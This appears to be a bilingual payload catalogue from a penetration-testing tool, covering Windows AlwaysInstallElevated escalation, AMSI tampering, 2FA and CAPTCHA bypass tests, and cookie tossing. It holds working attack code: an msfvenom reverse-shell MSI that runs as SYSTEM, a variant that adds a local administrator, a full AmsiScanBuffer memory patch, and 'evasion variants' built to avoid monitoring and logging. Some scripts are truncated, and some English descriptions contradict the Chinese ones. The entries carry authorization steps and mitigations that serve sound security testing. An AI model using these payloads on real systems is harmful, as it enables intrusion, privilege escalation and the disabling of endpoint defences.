name.zh: AlwaysInstallElevated 策略审计

description.zh: 检查 AlwaysInstallElevated 策略位，验证 MSI 以 SYSTEM 安装的提权前提。
description.en: Checks both HKCU and HKLM AlwaysInstallElevated policy values and deploys a crafted MSI that Windows Installer executes as SYSTEM, confirming the privilege-escalation precondition.

overview.zh: 该 Payload 覆盖 AlwaysInstallElevated 策略审计场景，检验系统是否允许普通用户以 SYSTEM 权限安装 MSI。验证维度含双 Hive 策略查询、MSI 载荷生成与静默安装三步，对应第 1 至第 3 步。
overview.en: This payload covers AlwaysInstallElevated policy auditing, testing whether standard users can install MSI packages with SYSTEM privileges. Validation covers dual-hive policy queries, MSI payload generation and silent installation, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 HKCU 与 HKLM 同时启用 AlwaysInstallElevated：Windows Installer 将以 SYSTEM 执行任意用户提供的 MSI，攻击者构造安装包即获得系统权限。
vulnerability.en: The root cause is AlwaysInstallElevated enabled in both HKCU and HKLM: Windows Installer then runs any user-supplied MSI as SYSTEM, so a crafted package grants system privileges.

exploitation.zh: 第 1 步查询 HKCU 与 HKLM 的 AlwaysInstallElevated 值，两处均为 0x1 即策略生效；第 2 步用 msfvenom 生成以 SYSTEM 回连的 MSI 验证包；第 3 步以 msiexec 静默安装，载荷以 SYSTEM 执行并回连监听即确认提权路径。以 SYSTEM 会话建立为成功判据。占位符在全局变量菜单替换；安装完成后卸载测试包。
exploitation.en: In step 1, query AlwaysInstallElevated under HKCU and HKLM; both reading 0x1 means the policy is live. In step 2, generate a SYSTEM-callback MSI with msfvenom as the verification package. In step 3, install silently with msiexec; the payload executing as SYSTEM and calling back confirms the escalation path. Judge success by a SYSTEM session. Replace placeholders via the global variables menu; uninstall the test package afterwards.

mitigation.zh:
删除 HKCU/HKLM 两处策略值，经组策略（管理模板→Windows 组件→Windows Installer→"始终以提升的权限安装"=已禁用）固化，监控 SYSTEM 上下文的 msiexec：
    reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /f
    reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /f
    Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} | ? { $_.Message -match 'msiexec' }
mitigation.en: Remove AlwaysInstallElevated from both hives and hard-disable via Group Policy, monitoring SYSTEM-context msiexec installs. After the fix, replay step 1: the value should be absent and step 3 installation should fail.

description.zh: 查询 HKCU 与 HKLM 的 AlwaysInstallElevated 值；两处均为 1 即任意 MSI 将以 SYSTEM 安装，无需管理员密码即成立提权前提。
description.en: Query AlwaysInstallElevated under both HKCU and HKLM; both set to 1 means any MSI installs as SYSTEM with no admin password.

attackChain.payload:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

title.zh: 生成恶意 MSI 安装包

description.zh: 用 msfvenom 生成内嵌反向连接载荷的 evil.msi 安装包；本地监听就绪后等待安装触发，以 SYSTEM 权限回连上线。
description.en: Build evil.msi embedding a reverse payload with msfvenom; once installed it calls back to the waiting listener with SYSTEM rights.

attackChain.payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f msi > evil.msi

description.zh: 用 msiexec 的 quiet 与 qn 参数静默安装第 2 步的 MSI；全程无界面无凭据提示，载荷以 SYSTEM 执行即完成提权上线。
description.en: Install the step-2 MSI with msiexec /quiet /qn; no UI, no credentials, and the payload executes as SYSTEM to finish the escalation.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 AlwaysInstallElevated 策略审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AlwaysInstallElevated Policy Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: AlwaysInstallElevated 策略审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AlwaysInstallElevated Policy Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: MSI 以 SYSTEM 安装——安装动作限定为写 marker 文件的自定义包；验证后立即删除 MSI 并还原策略位。
opsecTips.en: The MSI runs as SYSTEM — limit it to a custom package that only writes a marker file, then remove the MSI and revert the policy values immediately.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 规避变体：WMI 静默安装

wafBypass.command:
copy evil.msi C:\Windows\temp\evil.msi 
 powershell -nop -c "(Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation='C:\Windows\temp\evil.msi'}).ReturnValue"

description.zh: 规避点：以 WMI 替代 msiexec.exe 进程链，绕过针对 msiexec 的监控。判据：返回 0 且载荷执行。
description.en: WMI replaces the msiexec.exe process chain. Success: ReturnValue 0 and payload runs.

title.zh: 规避变体：本地账户免外联载荷

wafBypass.command: msfvenom -p windows/x64/exec CMD='net localgroup administrators eva /add' -f msi > evil.msi

description.zh: 规避点：改用本地加组命令，避免 reverse_tcp 外联触发流量告警。判据：eva 出现在管理员组。
description.en: Local group-add avoids reverse traffic alerts. Success: eva appears in administrators.

title.zh: 规避变体：日志抑制安装

description.zh: 规避点：不传任何 /l 日志参数，静默安装不在磁盘生成安装日志文件（Windows 事件日志仍会记录安装事件）。判据：安装成功且目录中无新增 .log 文件。
description.en: Redirects MSI logging to nul. Success: install completes with no log file.

title.zh: 规避变体：装后即卸清理

description.zh: 规避点：卸载移除安装记录并删除介质。判据：已安装程序列表与目录均无痕迹。
description.en: Uninstall removes the registration and the media is deleted. Success: no trace in installed programs or disk.

execution.command:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

description.zh: 查询 HKCU 与 HKLM 的 AlwaysInstallElevated；两处均返回 0x1 即策略启用、MSI 将以 SYSTEM 安装。
description.en: Query AlwaysInstallElevated under HKCU and HKLM; both returning 0x1 means the policy is on and MSIs install as SYSTEM.

title.zh: 生成 MSI 安装包载荷

execution.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f msi > evil.msi

description.zh: 用 msfvenom 生成以 SYSTEM 权限回连的恶意 MSI 安装包，配合 AlwaysInstallElevated 策略验证提权路径。
description.en: Uses msfvenom to build a malicious MSI that calls back with SYSTEM privileges, validating the elevation path under the AlwaysInstallElevated policy.

description.zh: 静默安装生成的 MSI；载荷以 SYSTEM 权限执行即确认 AlwaysInstallElevated 提权路径。
description.en: Silently install the generated MSI; the payload executing as SYSTEM confirms the AlwaysInstallElevated elevation path.

name.zh: AMSI 完整性与事件审计

description.zh: 测试 AMSI 初始化与扫描完整性（amsiInitFailed、内存补丁），验证 EDR 捕获边界。
description.en: Sets the amsiInitFailed flag and patches the AMSI scan function in-process, then confirms script content evades scanning while correlating which EDR telemetry signals reveal the tampering.

category.zh: 终端防护与遥测完整性

overview.zh: AMSI 完整性与事件审计覆盖反恶意软件扫描接口失效场景：针对部署 AMSI 与脚本遥测的 Windows 终端，验证反射置位与内存修补等变体能否使 AMSI 停止拦截。验证维度涵盖反射设置 amsiInitFailed、混淆标志翻转、防护产品基线查询与现成工具加载四类。
overview.en: AMSI Integrity and Event Audit covers antimalware scan interface neutralization: on Windows endpoints with AMSI and script telemetry deployed, verify whether reflection-based flag setting and in-memory patching variants silence AMSI. Verification dimensions cover reflection on amsiInitFailed, obfuscated flag flips, AV product baseline queries, and ready-made tool loading.

vulnerability.zh: 根因是 AMSI 在 PowerShell 进程内以 amsiInitFailed 静态标志判定可用性，脚本持有反射访问时即可置位让扫描静默跳过；其完整性依赖进程内内存保护与脚本遥测的同步告警，任一缺失即形成静默失效窗口。
vulnerability.en: The root cause is that AMSI relies on the amsiInitFailed static flag inside the PowerShell process to judge availability, so scripts with reflective access can set it and silently skip scanning; its integrity depends on in-process memory protection and synchronized script telemetry, and either gap creates a silent failure window.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用反射将 amsiInitFailed 置为 true，后续含已知签名的脚本不再被拦截即确认成功；第 2 步用混淆字段遍历版本复现同样效果并对比遥测差异；第 3 步查询 root/SecurityCenter2 获取 AV 产品与 productState，记录防护基线用于解释拦截行为；第 4 步加载 Invoke-AmsiBypass 验证工具链，标记脚本通过扫描即确认。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 sets amsiInitFailed to true via reflection — known-signature scripts no longer blocked confirms success; step 2 replays with an obfuscated field-walk version and compares telemetry; step 3 queries root/SecurityCenter2 for AV products and productState to record the protection baseline explaining interception behavior; step 4 loads Invoke-AmsiBypass to validate the toolchain — a flagged script passing the scan confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
启用脚本块日志与约束语言模式，对 amsiInitFailed 反射访问与 Amsi* API 调用建立检测规则并实时告警：
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy /t REG_DWORD /d 4 /f
mitigation.en: Enable script-block logging with detections for amsiInitFailed reflection and Amsi* API calls, turn on tamper protection and integrity monitoring, and deploy constrained language mode for PowerShell; alert in real time on AMSI interruption. After the fix, regress with the step 1 sample: the reflective set must be blocked or alerted immediately.

description.zh: 用 Get-CimInstance 查 root/SecurityCenter2 的 AntiVirusProduct；产品名与版本即确定要绕过的防护组合。
description.en: Query AntiVirusProduct in root/SecurityCenter2 with Get-CimInstance; product names and versions define which protections must be bypassed.

title.zh: 反射置空 AMSI 标志
title.en: Flip the AMSI flag via reflection

description.zh: 反射读取 AmsiUtils.amsiInitFailed 并置 true；随后加载脚本不再触发 AMSI 拦截即扫描链路被断开。
description.en: Reflect AmsiUtils.amsiInitFailed and set it true; scripts loading without AMSI errors means the scanning chain is severed.

description.zh: 改用 GetTypes 遍历匹配 *iUtils 再取字段赋值；效果等价而语句不固定即绕过针对经典写法的检测规则。
description.en: Switch to a GetTypes walk matching *iUtils and set the field; identical effect with non-fixed syntax dodges rules keyed on the classic form.

description.zh: Import-Module 加载 AmsiBypass.ps1 后再导入攻击模块；全程无 AMSI 告警即建立后续利用的干净执行环境。
description.en: Import AmsiBypass.ps1 then load offensive modules; no AMSI alerts throughout establishes a clean environment for follow-on tooling.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 AMSI 完整性与事件审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AMSI Integrity and Event Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: AMSI 完整性与事件审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: AMSI Integrity and Event Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 补丁只作用于当前进程——验证后结束进程还原环境；补丁脚本在报告中以片段引用，不整篇留存。
opsecTips.en: The patch lives only inside the current process — end the process afterwards to restore a clean state, and cite patch scripts as snippets in the report rather than full copies.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 大小写与反射变形规避变体

description.zh: 绕过对 AmsiUtils/amsiInitFailed 完整字符串的特征匹配：运行期拼接类型名。成功判据：后续恶意脚本无 AMSI 拦截事件。
description.en: Evades signature matching on the full AmsiUtils/amsiInitFailed string by assembling the type name at runtime. Success: subsequent malicious scripts raise no AMSI interception events.

wafBypass.command: Add-Type -Namespace W -Name K -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m,string p);[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string f);[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);';$a=[W.K]::GetProcAddress([W.K]::LoadLibrary('amsi.dll'),'AmsiScanBuffer');[W.K]::VirtualProtect($a,6,0x40,[ref]0)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)

description.zh: 绕过 amsiInitFailed 单点检测：GetProcAddress/VirtualProtect 定位 amsi!AmsiScanBuffer 并把首 6 字节补丁为 mov eax,0x80070057; ret，AMSI 扫描恒返回 E_FAIL（调用方按扫描失败放行），无 .NET 反射特征。成功判据：补丁后加载已知恶意脚本无 AMSI 拦截且脚本正常执行。
description.en: Locates amsi!AmsiScanBuffer via GetProcAddress/VirtualProtect and patches its first six bytes to mov eax,0x80070057; ret, making every scan fail open with no .NET reflection traces. Success: a known-malicious script loads and runs with no AMSI block afterwards.

explanation.zh: 目标页改为 PAGE_EXECUTE_READWRITE 允许写入
explanation.en: Flip the page to PAGE_EXECUTE_READWRITE for writing

explanation.zh: 补丁字节：mov eax,0x80070057; ret（恒返回 E_FAIL）
explanation.en: Patch bytes: mov eax,0x80070057; ret (always E_FAIL)

explanation.zh: 把补丁字节写入内存完成闭环
explanation.en: Copy the bytes into memory to finish the loop

title.zh: 无 PowerShell 进程规避变体

description.zh: 绕过基于 powershell.exe 的 AMSI 上下文：在自建 .NET 程序集内执行，AMSI 需另路覆盖。成功判据：程序集动作完成且 powershell AMSI 无记录。
description.en: Evades powershell.exe-scoped AMSI context by executing inside a custom .NET assembly that AMSI does not cover. Success: the assembly's actions complete with no PowerShell AMSI records.

description.zh: 通过反射设置 amsiInitFailed 禁用 AMSI；成功时命令无报错且后续含已知签名的脚本不再被拦截。
description.en: Disable AMSI by reflecting amsiInitFailed; the command completing without error and subsequent known-signature scripts no longer blocked confirms success.

description.zh: 以混淆方式定位并翻转标志位；成功时脚本执行完成且 AMSI 扫描不再触发拦截。
description.en: Locate and flip the flag via obfuscated code; the script completing with no further AMSI blocks confirms success.

title.zh: 枚举 AV 产品状态
title.en: AMSI Integrity and Event Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_AMSI_BYPASS_E_3 与蓝队日志；成功时列出 AV 产品 displayName 与 productState，用于核对防护基线。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_AMSI_BYPASS_E_3 with blue-team logs; AV products listed with displayName and productState for the protection baseline confirms success.

description.zh: 加载现成 AmsiBypass 脚本执行；成功时调用无报错且标记脚本可通过 AMSI 扫描。
description.en: Load and run the ready-made AmsiBypass script; the call completing without error and marker scripts passing AMSI scanning confirms success.

name.zh: 双因素验证码输入 Schema

description.zh: 提交空值、类型异常与超长验证码，验证 2FA 输入校验与失败锁定行为。
description.en: Submits empty, wrong-typed, and overlong codes to the verification endpoint, exposing missing input whitelisting where loose parsing treats null or arrays as valid and client-asserted verified fields reach the authorization state.

overview.zh: 该 Payload 覆盖双因素验证码输入 Schema 场景，检验验证端点对空值、缺失、数组与客户端断言字段的解析是否失败关闭。验证维度为畸形 OTP 请求体的批量阴性样例，对应第 1 步。
overview.en: This payload covers the 2FA code input schema, testing whether the verification endpoint fails closed on empty, missing, array and client-asserted fields. Validation submits a batch of malformed OTP bodies as negative samples, mapped to step 1.

vulnerability.zh: 根因在于验证端点缺少输入类型与字段白名单：宽松解析把空数组或 null 当作有效输入，甚至接受客户端断言的 verified 字段直接进入授权状态。
vulnerability.en: The root cause is the verification endpoint lacking input-type and field allowlists: lenient parsing treats empty arrays or null as valid input, and client-asserted verified fields may directly grant authorization state.

exploitation.zh: 第 1 步按脚本逐条提交空串、null、数组、携带 skip 与 verified 字段的 OTP 请求体，全部返回拒绝且不改变会话状态即证明 Schema 完整；任一畸形输入被接受或进入下一流程即确认解析缺陷。成功判据以响应与 mfa 状态对照为准。占位符在全局变量菜单替换；全部为无副作用提交。
exploitation.en: In step 1, submit empty-string, null, array, skip-bearing and verified-field OTP bodies one by one per the script; uniform rejection with no session-state change proves a complete schema, any accepted malformed input or flow progression confirms the parsing defect. Judge success by responses versus mfa state. Replace placeholders via the global variables menu; all submissions are side-effect free.

mitigation.zh:
验证端点定义严格请求 Schema：otp 为 6 位定长数字字符串，未知字段直接拒绝，客户端提交的 verified、skip 等状态字段一律不采信。
    from pydantic import BaseModel, Field, ConfigDict
    class OtpRequest(BaseModel):
        otp: str = Field(pattern=r'^\d{6}$')
        model_config = ConfigDict(extra='forbid')
mitigation.en: Define a strict request schema: otp must be a fixed-length string, unknown fields ignored with alerts, and client status fields never trusted. After the fix, replay step 1: every malformed request should be rejected with 400.

description.zh: 为双因素验证码输入 Schema准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for Two-Factor Code Input Schema.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

prerequisites.zh: 使用启用 2FA 的合成账户、可重置 TOTP secret、一次性恢复码和无敏感字段标记资源。
prerequisites.en: Use a synthetic account with 2FA, a resettable TOTP secret, single-use recovery codes, and a nonsensitive marker resource.

prerequisites.zh: 记录密码验证后、第二因子前后和恢复流程中的服务端认证级别、会话 ID、尝试计数与锁定事件。
prerequisites.en: Record server-side authentication level, session ID, attempt count, and lockout events after password validation, before and after the second factor, and during recovery.

analysis.zh: 阳性强制浏览要求仅完成第一因子的会话读取同一受保护标记对象；响应篡改只有导致服务端认证级别改变才成立；输入 schema 缺陷要求空值、数组或额外标志被服务端当作有效 OTP；恢复码必须证明重复使用或未受限验证。页面跳转、修改本地 JSON、HTTP 200 或一次并发异常都不是绕过。
analysis.en: Forced-browsing is positive only when a first-factor-only session reads the same protected marker. Response tampering matters only if server authentication level changes. An input-schema flaw requires an empty, array, or extra flag to be accepted as a valid OTP. Recovery-code flaws require replay or unthrottled validation. Navigation, local JSON edits, HTTP 200, or one concurrency anomaly are not bypass.

opsecTips.zh: 仅尝试少量预先批准的无效码和一个有效测试码；出现锁定、短信发送、恢复码消费或非预期会话升级立即停止。
opsecTips.en: Try only a few approved invalid codes and one valid test code; stop on lockout, message delivery, recovery-code consumption, or unintended session elevation.

opsecTips.zh: 轮换 TOTP secret 与恢复码，撤销测试会话，恢复尝试计数并删除 Burp 项目和临时响应。
opsecTips.en: Rotate the TOTP secret and recovery codes, revoke test sessions, restore attempt counters, and delete Burp projects and temporary responses.

name.zh: 双因素恢复码原子消费

description.zh: 并发提交同一恢复码，验证其消费的原子性与单次性约束。
description.en: Submits the same recovery code concurrently, proving validation and burn-in are not one atomic transaction so parallel requests all pass the existence check and the single-use constraint is void.

overview.zh: 该 Payload 覆盖双因素恢复码原子消费场景，检验同一恢复码在并发提交下是否只被成功使用一次。验证维度为并发脚本打击恢复码消费端点的单步样例，对应第 1 步。
overview.en: This payload covers atomic recovery-code consumption for 2FA, testing whether one recovery code succeeds exactly once under concurrent submissions. Validation hammers the recovery-code consume endpoint with a concurrent script in one step, mapped to step 1.

vulnerability.zh: 根因在于恢复码校验与烧毁不在同一原子事务：并发请求在状态更新前同时通过存在性检查，同一码被多次接受，恢复码的单次性形同虚设。
vulnerability.en: The root cause is recovery-code validation and burning outside one atomic transaction: concurrent requests pass the existence check before the state update, the same code is accepted repeatedly, and single-use semantics collapse.

exploitation.zh: 第 1 步以并发脚本携带同一恢复码同时发起多次消费请求，统计成功响应数量：恰好一次成功其余拒绝即证明原子性成立，多次成功即确认竞态缺陷。成功判据以成功计数与账号状态为准。占位符在全局变量菜单替换；使用专用测试恢复码并在测试后重置。
exploitation.en: In step 1, fire multiple concurrent consume requests with the same recovery code via the script and count successes; exactly one success with the rest rejected proves atomicity, multiple successes confirm the race defect. Judge success by the success count and account state. Replace placeholders via the global variables menu; use a dedicated test code and reset it afterwards.

mitigation.zh:
恢复码校验与烧毁合并为同一原子操作：条件 UPDATE 保证仅首个并发请求命中未消费记录，以影响行数判定成败并记录消费序号。
    UPDATE recovery_codes
       SET used_at = NOW(), used_seq = used_seq + 1
     WHERE code_hash = SHA2(?, 256) AND user_id = ? AND used_at IS NULL;
    -- affected_rows == 1 才视为消费成功，否则拒绝
mitigation.en: Consume recovery codes via atomic database updates or distributed locks, completing validation and burning in one transaction with a consumption sequence logged. After the fix, replay step 1: successes must always equal exactly one.

 import concurrent.futures 
 import requests 
 TARGET = "http://127.0.0.1:8080/test/verify-backup-code"

     return requests.post(TARGET, json={"backup_code": "PAYLOADER_TEST_BACKUP", "session": "PAYLOADER_TEST_SESSION"}, timeout=5).status_code 
 with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:

 print(results)

python3 - <<'PY' 
 import asyncio, aiohttp 
 TARGET="http://127.0.0.1:8080/test/verify-backup-code" 
 async def main(): 
     async with aiohttp.ClientSession() as s: 
         rs = await asyncio.gather(*[s.post(TARGET, json={"backup_code":"PAYLOADER_BACKUP_CODE","session":"PAYLOADER_TEST_SESSION"}) for _ in range(200)]) 
         print(sum(r.status == 200 for r in rs)) 
 asyncio.run(main())

description.en: Bypasses non-atomic consumption by racing 200 async requests against one code. Success: success count is greater than 1.

wafBypass.command:
python3 - <<'PY'
import concurrent.futures, itertools, requests
TARGET="http://127.0.0.1:8080/test/verify-backup-code"
uas=itertools.cycle(["Mozilla/5.0","curl/8.0","python-requests"])
def hit(i):
    return requests.post(TARGET, json={"code":"PAYLOADER_BACKUP_CODE"}, headers={"User-Agent":next(uas),"X-Forwarded-For":f"10.0.{i//250}.{i%250}"}).status_code
with concurrent.futures.ThreadPoolExecutor(50) as ex:
    codes=list(ex.map(hit, range(200)))
print(codes.count(200))
PY

name.zh: 双因素认证服务端状态强制

description.zh: 绕过前端直接请求 2FA 之后的端点，验证服务端是否强制完成第二因素验证。
description.en: Requests post-2FA endpoints directly while skipping the second factor, proving the server treats first-step login as fully authenticated because mfa-pending state is enforced only by the frontend route.

overview.zh: 该 Payload 覆盖双因素认证服务端状态强制场景，检验仅有第一因素凭据的会话能否直接访问受保护资源或跳过第二因素。验证维度为第一因素会话访问 marker 与验证端点绕过的单步样例，对应第 1 步。
overview.en: This payload covers server-side 2FA state enforcement, testing whether a session holding only first-factor credentials can reach protected resources or skip the second factor. Validation accesses the marker with a first-factor-only session and probes the verify endpoint in one step, mapped to step 1.

vulnerability.zh: 根因在于第二因素状态仅由前端路由控制：服务端把首步登录即视为完整认证，受保护接口与验证端点之间缺少 mfa-pending 状态门禁，跳过校验请求被直接放行。
vulnerability.en: The root cause is second-factor state governed only by frontend routing: the server treats step-one login as fully authenticated, protected APIs lack an mfa-pending gate, and requests skipping verification are served directly.

exploitation.zh: 第 1 步以仅完成第一因素的会话 Cookie 发送原始请求访问 marker 资源，再直接 POST 验证端点尝试跳过或空验证码路径；marker 返回受保护内容或验证端点放行即确认状态强制缺失，统一拦截则通过。成功判据以响应与 mfa 状态记录为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, use a session cookie holding only the first factor to send a raw request for the marker resource, then POST the verify endpoint directly attempting a skip or empty-code path; the marker returning protected content or the verify endpoint passing confirms missing state enforcement, uniform blocking passes. Judge success by responses and mfa-state records. Replace placeholders via the global variables menu.

mitigation.en: Issue an mfa-pending restricted session after login, have protected APIs check full authentication state, and ignore client-asserted pass fields at the verify endpoint. After the fix, replay step 1: both requests should be rejected and redirected to verification.

name.zh: CAPTCHA 重放与畸形值绕过

description.zh: 重复提交已通过验证的 CAPTCHA 会话，验证挑战与单次提交的绑定。
description.en: Replays an already-passed CAPTCHA challenge and submits missing or malformed values, verifying whether challenge state binds to the session and single-use consumption holds, or whether loose parsing opens an automation path.

overview.zh: 该 Payload 覆盖 CAPTCHA 挑战与会话绑定场景，检验验证码是否一次性消费且与会话绑定，空值与类型变体能否绕过校验。验证维度为有效值、重放与畸形值矩阵的单步样例，对应第 1 步。
overview.en: This payload covers CAPTCHA challenge and session binding, testing whether codes are consumed once, bound to the session, and whether empty or type-variant values bypass checks. Validation runs a matrix of valid, replayed and malformed values in one step, mapped to step 1.

vulnerability.zh: 根因在于验证码状态未与会话绑定或消费后不失效：同一验证码可重复提交，缺失与畸形值又落在宽松解析的放行分支，自动化攻击因此畅通。
vulnerability.en: The root cause is challenge state unbound to the session and not invalidated after consumption: the same code can be resubmitted, while missing and malformed values fall into lenient-parse acceptance branches, clearing the way for automation.

exploitation.zh: 第 1 步按脚本先以有效测试验证码完成一次基线提交，再用同一值重放，最后提交空串、null、undefined 与数组变体：重放被拒且全部畸形值拒绝即证明校验完整，任一放行即确认绑定或消费缺陷。成功判据以响应矩阵为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, first submit the valid test code as a baseline, replay the same value, then submit empty, null, undefined and array variants per the script; replay rejection plus uniform malformed-value rejection proves complete validation, any acceptance confirms a binding or consumption defect. Judge success by the response matrix. Replace placeholders via the global variables menu.

mitigation.zh:
验证码签发即绑定会话指纹，校验用 GETDEL 原子取出并立即失效，缺失、空值与类型异常统一失败关闭，不落任何放行分支。
    captcha = (request.form.get('captcha') or '').strip()
    expected = redis.execute_command('GETDEL', f'captcha:{session.id}')
    if not expected or not compare_digest(str(expected), captcha):
        abort(401)  # 取出即烧毁，重放必失败
mitigation.en: Bind challenges to a session fingerprint at issuance, burn on both pass and fail, and fail closed on missing or type-anomalous values. After the fix, replay the step 1 matrix: every replay and malformed submission should be rejected.

analysis.zh: 阳性重放要求一个已消费挑战再次通过服务端验证；schema 缺陷要求空值、null、数组或缺失字段在应强制 CAPTCHA 的同一风险状态下被接受；路由缺陷要求替代 API 绕过同一服务端策略。HTTP 200、验证码图片可 OCR、前端隐藏字段、参数被解析或密码字段变化都不是绕过证据。
analysis.en: Replay is positive only when a consumed challenge passes server validation again. A schema flaw requires empty, null, array, or missing input to be accepted under the same risk state. A route flaw requires an alternate API to bypass the same server policy. HTTP 200, OCR-readable images, front-end hidden fields, parsed parameters, or changed password fields are not bypass evidence.

opsecTips.zh: 仅重放一个本地测试挑战并使用固定错误密码；不得运行密码字典、调用真实短信/语音通道或第三方 OCR。

name.zh: CAPTCHA 路由覆盖绕过

description.zh: 对比有无 CAPTCHA 的等价路由，验证验证码策略覆盖是否一致。
description.en: Compares equivalent routes with and without CAPTCHA enforcement, proving validation is wired to only one entry middleware so switching Content-Type to the JSON route bypasses the human check entirely.

overview.zh: 该 Payload 覆盖 CAPTCHA 路由策略一致性场景，检验同一登录逻辑在表单路由与 JSON 路由上是否执行同等验证码校验。验证维度为两种 Content-Type 提交的单步对照，对应第 1 步。
overview.en: This payload covers CAPTCHA route-policy consistency, testing whether the same login logic enforces equivalent captcha checks on form and JSON routes. Validation contrasts submissions across both content types in one step, mapped to step 1.

vulnerability.zh: 根因在于验证码校验只挂在某一入口中间件：JSON 路由绕过了为表单路由配置的校验链，攻击者切换 Content-Type 即可绕过人机验证。
vulnerability.en: The root cause is captcha validation wired into only one entry middleware: the JSON route bypasses the chain configured for the form route, so switching Content-Type skips the human check.

exploitation.zh: 第 1 步以表单编码与 JSON 编码分别提交相同错误口令且不带验证码的登录请求，比对两条路由的响应：一条被验证码拦截而另一条进入口令校验即确认策略不一致。成功判据以响应差异与日志为准。占位符在全局变量菜单替换；同时核对两条路由的错误码结构。
exploitation.en: In step 1, submit the same wrong-password login without a captcha using both form and JSON encodings and compare the routes' responses; one blocked by captcha while the other proceeds to password checking confirms policy inconsistency. Judge success by response differences and logs. Replace placeholders via the global variables menu; also compare the two routes' error-code shapes.

mitigation.en: Centralize captcha validation in a shared login service layer instead of route middleware so every entry applies one policy. After the fix, replay step 1: both routes should return identical captcha requirements.

name.zh: Cookie 作用域与同名冲突

description.zh: 向子域或父域路径投掷同名 Cookie，验证会话或 CSRF 判定是否读取到攻击者写入的值。
description.en: Throws a same-named cookie at the parent domain or a longer path from an attacker-controlled subdomain and verifies whether session or CSRF logic reads the attacker's value under RFC 6265 ordering.

overview.zh: 该 Payload 覆盖 Cookie 作用域与同名冲突场景，检验攻击者能否利用 Domain、Path 与同名写入规则让伪造会话值压过真实凭据。验证维度为脚本注入多枚同名冲突 Cookie 的单步执行，对应第 1 步。
